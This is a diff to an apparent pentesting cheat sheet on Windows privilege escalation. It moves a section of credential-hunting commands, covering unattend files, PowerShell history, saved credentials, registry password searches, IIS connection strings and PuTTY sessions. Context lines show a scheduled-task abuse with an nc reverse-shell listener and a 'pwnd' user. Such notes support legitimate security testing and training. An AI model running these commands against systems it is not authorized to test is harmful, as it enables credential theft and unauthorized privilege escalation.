@@ -101,6 +101,60 @@ https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 https://github.com/PowerShellMafia/PowerSploit
 ```
 
+## Credentials ✅
+## File-Unattended ✅
+```powershell
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+```
+```powershell
+dir C:\sysprep.inf /s /p
+dir C:\sysprep.xml /s /p
+dir C:\unattend.xml /s /p
+dir C:\Users\*\.ssh\ # Check SSH keys
+
+findstr /si password *.txt
+type C:\Users\Administrator\Desktop\passwords.txt
+Get-ChildItem -Hidden -Path C:\Users\Public\  # List of hidden files
+
+Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Filter "Unattend.xml" -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Windows\Panther\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Windows\system32\sysprep\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Hidden -Path C:\Users -Recurse -Force | Select-String -Pattern "password|passwd|credentials|login" # Password hunting and sensitive information
+```
+## Powershell History ✅
+```powershell
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in cmd
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in powershell
+```
+## Check Windows Credentials ✅
+```powershell
+cmdkey /list # show save user credentials
+runas /savecred /user:<username> cmd.exe # run cmd with another user 
+runas /savecred /user:<username> powershell.exe # run powershell with another user
+```
+## Check Search of Passwords in Registry ✅
+```powershell
+# Pattern "password|passwd|credentials|login"
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+## IIS Configuration ✅
+```powershell
+type C:\inetpub\wwwroot\web.config | findstr connectionString
+forfiles /p C:\ /s /m web.config /c "cmd /c findstr /i connectionString @file" 2>$null
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+## Retrieve Credentials from Software: PuTTY ✅
+```powershell
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+
 ## Host-Security-Enumeration ✅
 ```powershell
 # Antivirus
@@ -341,62 +395,6 @@ net user pwnd
 runas /user:pwnd cmd.exe
 runas /user:pwnd powershell.exe 
 ```
-
-## DLL Hijacking ✅
-
-> [!Note]
-> 🔹 
-
-
-## Credentials ✅
-## File-Unattended ✅
-```powershell
-C:\Unattend.xml
-C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unattend\Unattend.xml
-C:\Windows\system32\sysprep.inf
-C:\Windows\system32\sysprep\sysprep.xml
-```
-```powershell
-dir C:\sysprep.inf /s /p
-dir C:\sysprep.xml /s /p
-dir C:\unattend.xml /s /p
-dir C:\Users\*\.ssh\ # Check SSH keys
-
-findstr /si password *.txt
-type C:\Users\Administrator\Desktop\passwords.txt
-Get-ChildItem -Hidden -Path C:\Users\Public\  # List of hidden files
-
-Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\ -Filter "Unattend.xml" -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Windows\Panther\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Windows\system32\sysprep\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
-
-Get-ChildItem -Hidden -Path C:\Users -Recurse -Force | Select-String -Pattern "password|passwd|credentials|login" # Password hunting and sensitive information
-```
-## Powershell History ✅
-
-```powershell
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in cmd
-type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in powershell
-```
-## Saved Windows Credentials ✅
-```powershell
-cmdkey /list # show save user credentials
-runas /savecred /user:<username> cmd.exe # run cmd with another user 
-runas /savecred /user:<username> powershell.exe # run powershell with another user
-```
-## IIS Configuration ✅
-```powershell
-type C:\inetpub\wwwroot\web.config | findstr connectionString
-forfiles /p C:\ /s /m web.config /c "cmd /c findstr /i connectionString @file" 2>$null
-type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
-```
-## Retrieve Credentials from Software: PuTTY ✅
-```powershell
-reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
-```
-
 ## Scheduled Tasks ✅
 ```powershell
 1️⃣ # Check and find vuln task on target system
@@ -412,6 +410,7 @@ nc -lvnp 4444
 5️⃣ # run the vuln task
 schtasks /run /tn vulntask 
 ```
+
 ## AlwaysInstallElevated ✅
 
 > [!Note]
